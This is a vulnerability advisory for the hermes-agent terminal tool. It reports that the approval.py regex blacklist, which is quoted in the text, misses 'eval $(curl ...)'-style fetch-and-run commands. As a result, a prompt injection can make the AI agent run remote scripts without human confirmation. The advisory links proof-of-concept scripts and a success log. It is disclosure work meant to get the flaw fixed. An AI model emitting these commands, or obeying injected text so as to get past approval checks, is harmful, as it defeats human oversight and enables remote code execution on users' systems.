@@ -1,0 +1,80 @@
+### Advisory Details
+
+**Title**: Hermes Agent - Terminal Tool Command Detection Bypass
+
+**Description**:
+
+### Summary
+
+The `hermes-agent` employs a `terminal_tool` allowing an autonomous AI agent to execute system commands. To prevent the execution of highly dangerous commands natively requested by compromised prompts (such as `curl xxx | bash`), a detection blacklist is maintained in `approval.py`. It requires human confirmation for explicitly flagged execution methods. However, the blacklist approach has a "Narrow Fix" vulnerability, incorrectly tracking purely syntactical features like pipeline operators but bypassing functionally semantic equivalent representations of shell executions. An attacker can instruct the LLM to use un-flagged execution channels (such as `eval $(curl... )`), bypassing the detection approval lock completely, resulting in silent zero-click Remote Code Execution.
+
+### Details
+
+The dangerous command detection loop evaluates generated shell tasks through a list of predefined regex matches: `DANGEROUS_PATTERNS` in `tools/approval.py` (e.g. `(r'\b(curl|wget)\b.*\|\s*(ba)?sh\b', "pipe remote content to shell")`).
+
+The vulnerability lies in the fact that it adopts a purely syntactic evaluation, neglecting alternate standard bash syntaxes. Specifically, utilizing the `eval` command coupled with command substitution `eval $(wget ...)` effectively bypasses the regex matcher completely. When the external text payload instructs the LLM agent to emit this pattern, `approval.py` concludes the command is "safe", skipping the interactive user challenge prompt and proceeding to execute arbitrary remote bash scripts.
+
+### PoC
+
+#### Prerequisites
+
+An active, vanilla installation of the `hermes-agent` utilizing `terminal_tool` functionalities against a compliant LLM interaction flow.
+
+#### Reproduction Steps
+
+The provided proof-of-concept simulates a malicious prompt injection intended to exploit the RCE bypass constraint. It creates a simple payload loopback handler testing whether executing `eval $(curl ...)` generates a confirmation block or succeeds directly.
+
+1. Download the Exploit verification script: [poc_exploit.py](https://gist.github.com/YLChen-007/e397d92ad474b9f333d4df377257fc7f)
+   *(This launches a miniature listener imitating a remote malware host and instructs the Agent to deploy via eval)*
+
+2. Download the Control Experiment verification script: [control-normal_behavior.py](https://gist.github.com/YLChen-007/1f44fee8592734b7c6a9759dbfdaf1b3)
+   *(This script tests the identically equivalent attack using the recognized piped execution method like `curl ... | bash` to prove protection)*
+
+3. Run the Control Experiment inside the hermes-agent python environment:
+   ```bash
+   python3 control-normal_behavior.py
+   ```
+   *(Expected behavior: Detection engages; command halts; payload blocked. Result gives `[SUCCESS]` verifying protection functions).*
+
+4. Run the Bypass Exploit:
+   ```bash
+   python3 poc_exploit.py
+   ```
+   *(Expected behavior: Detection fails; prompt approves silently; payload executes. Generates `/tmp/pwned_exploit.txt` and `[SUCCESS]`).*
+
+5. Alternatively, review the complete enumeration tool: [poc_bypass_detection.py](https://gist.github.com/YLChen-007/b10d069e4a7a740572f5391699c82675). It automatically probes across 16 different semantic variants of `eval` and `source`.
+
+### Log of Evidence
+
+```log
+[*] Sending malicious prompt to the agent...
+[SUCCESS] Exploit bypassed detection and executed the command.
+```
+
+### Impact
+
+The vulnerability allows any malicious actor to implement arbitrary Remote Code Execution using untrusted LLM input injection points. As long as users parse maliciously tailored text containing the bypass commands, the Agent silently downloads and executes the provided target shell malware, completely neutralizing the agent's built-in sandbox validation.
+
+### Affected products
+
+- **Ecosystem**: python
+- **Package name**: hermes-agent
+- **Affected versions**: <= commit 5157f5427f19488b31c6fdebbacd15d798ce7f63
+- **Patched versions**: <None>
+
+### Severity
+
+- **Severity**: High
+- **Vector string**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+
+### Weaknesses
+
+- **CWE**: CWE-185: Incorrect Regular Expression
+- **CWE**: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+
+### Occurrences
+
+| Permalink | Description |
+| :--- | :--- |
+| [https://github.com/nousresearch/hermes-agent/blob/main/tools/approval.py#L94-L101](https://github.com/nousresearch/hermes-agent/blob/main/tools/approval.py#L94-L101) | The predefined blacklist of dangerous shell commands entirely reliant on incomplete regular expressions. |
+| [https://github.com/nousresearch/hermes-agent/blob/main/tools/approval.py#L182-L191](https://github.com/nousresearch/hermes-agent/blob/main/tools/approval.py#L182-L191) | The `detect_dangerous_command` logic executing the bypassable regex constraints. |
